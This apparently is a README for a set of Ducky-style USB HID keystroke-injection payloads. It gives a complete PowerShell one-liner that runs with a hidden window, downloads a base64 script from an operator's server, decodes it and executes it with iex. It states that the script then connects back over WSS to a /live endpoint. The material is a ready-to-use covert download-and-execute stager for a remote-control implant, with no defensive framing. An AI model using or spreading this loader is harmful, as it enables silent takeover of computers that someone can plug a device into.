# macros

Ducky-style keyboard scripts (e.g. for USB HID). One payload per file.

**Files:**
- **sync.txt** – Run loader only (fetch /sync, decode, run). Replace `HOSTPORT` with your server (e.g. `192.168.1.100:8443`).
- **sync-and-view.txt** – Same, then open browser to `/view`. Replace `HOSTPORT` in both places.

**Sync endpoint:** GET `/sync` returns a base64-encoded script. If the server has `sync_token` set in config, use `https://HOST:PORT/sync?k=YOUR_TOKEN` in the loader URL.

**Windows (PowerShell) loader** (for custom macros):

```powershell
powershell -nop -w hidden -c "$b=(New-Object Net.WebClient).DownloadString('https://HOST:PORT/sync');iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"
```

Replace `HOST:PORT` with your server. The script connects back over WSS to `/live`.
